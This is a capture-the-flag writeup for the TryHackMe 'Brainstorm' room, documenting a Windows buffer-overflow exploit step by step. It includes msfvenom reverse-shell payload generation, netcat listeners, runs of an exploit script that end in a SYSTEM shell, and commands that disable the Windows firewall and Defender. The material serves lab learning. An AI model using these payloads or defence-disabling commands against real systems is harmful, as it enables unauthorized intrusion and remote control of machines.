# TryHackMe - Brainstorm

Writeup for the [Brainstorm](https://tryhackme.com/room/brainstorm) room in [TryHackMe](https://tryhackme.com/).

## Setup

Attacker: 
* Kali Linux - IPs: 10.2.31.1, 10.9.0.117
* Windows 10 VM - IP: 10.2.31.155

Target: 
* Windows, IP 10.10.144.220

## Exploitation steps

1. [Target enumeration](#Target-enumeration)
1. [Binary exploration](#Binary-exploration)
1. [Buffer overflow exploit](#Buffer-overflow-exploitn)

## Target enumeration

After starting the machine, I began an nmap enumeration:
```
nmap -n -Pn -p- 10.10.144.220
```

The target had some interesting open ports.

Whenever I find FTP or SMB ports I already start some manual exploration while at the same time executing other enumeration tools (enum4linux, nmap --scrip, etc).

Trying to connect to the FTP port (21) anonymously was a success:
```
ftp 10.10.144.220 21
```

Two interesting files were found in a directory and downloaded:
```
mget *
```

These files seemed like they were key to this challenge and I decided to test them in a Windows enviroment. 

I configured a temporary Windows 10 Virtual Machine and installed the following tools:

* Immunity Debugger: https://www.immunityinc.com/products/debugger/
  * Download and follow the default install
* mona.py: https://github.com/corelan/mona
  * Download and copy the file to the 'PyCommands' directory inside the Immunity Debugger install dir (usually is at 'C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands')

I disabled Windows firewall and antivirus so as not to have any problems during the tests:
```
netsh advfirewall set allprofiles state off
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

With the Windows VM setup, it was time to test the binary.

## Binary exploration 

First thing I did was simply to run the application and see what it did.

With the application running, I verified if it had any open ports:
```
tasklist /v | findstr FILENAME.exe
```

```
netstat -ano | findstr 524
```


Nice! The opened port is one of the ports found during the target enumeration. The target is probably running this application.

We can interact both with the target and the Windows VM to find out if they are indeed running the same application:

* Windows VM
```
nc -nv 10.2.31.155 9999
```


* Target
```
nc -nv 10.10.144.220 9999
```


They are probably the same! Now it was time to test for some buffer overflow vulnerabilites.

During my studies I created a somewhat generic Python script to ease this type of test:
* ig-buffer-overflow.py: https://github.com/isabellecda/cyber-scripts/tree/main/buffer-overflow

I used the script in all following steps. Please feel free to reuse it and contribute to it.

First thing was to open the application in the debugger and send some random bytes to it (I sent 10000). In this case I tried to crash the application after the 'user' input, while it was waiting for the write content.
```
./ig-buffer-overflow.py -m test --rhost=10.2.31.155 --rport=9999 --buffsize=10000 --buffhead='' --interact=";;user"
```

Nice! The application crashed. Analysing the debugger we can see that we could overwrite the EIP and that the ESP pointed to some of the content that we sent:



Verifying our memory disposition (right-click on 'ESP' → Follow in Dump), we could see that the application broke at aproximaly 4096 bytes (1000h):



Now it was time to try to find out where in our sent content was the EIP, or, as also known, find out what was the EIP offset. 

I restarted the application on the debugger and sent a cyclic string from my Kali Linux:
```
./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user"
```


The application crashed with EIP = 31704330

Using the same script, I could now find where in the string I could set the EIP:
```
./ig-buffer-overflow.py -m checkoffset --value 31704330 --length=4096
Offset for length 4096: 2012
```

I now had to find the address of an instruction that could jump to the ESP. I used mona.py:
```
!mona jmp -n -r ESP
```


I used the first found address (0x625014df)

Before sending a test shell code, I tested the application for bad chars (I already removed the null byte '00' since this usually crashs memory):
```
./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=l625014df --badchar=after --exclude=00
```

```
!mona config -set workingfolder c:\temp
!mona bytearray
!mona compare -f c:\temp\bytearray.bin -a 012DEEA8
```


Only '00' was found out as a badchar (since I didn't send it). I could finally test the execution of some shell code.

I generated the payload using msfvenon:
```
msfvenom -p windows/shell_reverse_tcp -b "\x00" LHOST=10.2.31.1 LPORT=80 -f hex EXITFUNC=thread -o reverse280
```

I set up a listener on my Kali Linux:
```
sudo rlwrap -a nc -lvnp 80
```

And sent the exploit:
```
./ig-buffer-overflow.py -m exploit --rhost=10.2.31.155 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=l625014df --shellcode=reverse280 --nops=12
```



Success! Got the shell. But on my Windows VM.


## Buffer overflow exploit

I now only had to adapt the exploit so that it could run on the target machine.

I regenerated the shell code:
```
msfvenom -p windows/shell_reverse_tcp -b "\x00" LHOST=10.9.0.117 LPORT=80 -f hex EXITFUNC=thread -o reverse980
```

Set up a listener:
```
sudo rlwrap -a nc -lvnp 80
```

Executed the exploit:
```
./ig-buffer-overflow.py -m exploit --rhost=10.10.144.220 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=l625014df --shellcode=reverse980 --nops=12
```

Bingo! Got a privileged user shell (nt authority\system)!

I searched for the file using the following Windows commands and completed the challenge!
```
cd C:\
dir /b/s *root.txt
type "C:\FINDTHEPATH\root.txt"
```

THE END!

Note: I did try to crash the application at the 'user' parameter, but for some reason could not do it. I saw that I could overwrite the EIP in this case, so I'll probably retry this latter.
